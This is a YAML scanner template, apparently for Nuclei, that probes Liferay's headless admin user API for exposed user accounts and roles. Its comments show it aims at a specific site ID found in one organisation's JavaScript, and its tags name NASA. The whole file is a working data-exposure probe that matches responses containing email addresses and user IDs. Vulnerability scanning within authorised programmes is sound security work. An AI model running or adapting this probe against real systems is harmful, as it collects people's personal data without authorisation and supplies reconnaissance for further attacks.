id: liferay-admin-user-leak

info:
  name: Liferay Headless Admin User Leak (Site 10157)
  author: R00t3dbyFa17h
  severity: critical
  description: Checks for exposed User Account data via Headless Admin User API using discovered Site ID.
  tags: liferay, leak, nasa

requests:
  - method: GET
    path:
      # Payload 1: General User Accounts check
      - "{{BaseURL}}/o/headless-admin-user/v1.0/user-accounts"
      # Payload 2: TARGETED check using the Site ID we found in the JS
      - "{{BaseURL}}/o/headless-admin-user/v1.0/sites/10157/user-accounts"
      # Payload 3: Check for specific roles (often less protected)
      - "{{BaseURL}}/o/headless-admin-user/v1.0/roles"

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          # We are looking for JSON data containing email addresses or user IDs
          - "status_code == 200 && contains(body, 'emailAddress') && contains(body, 'id')"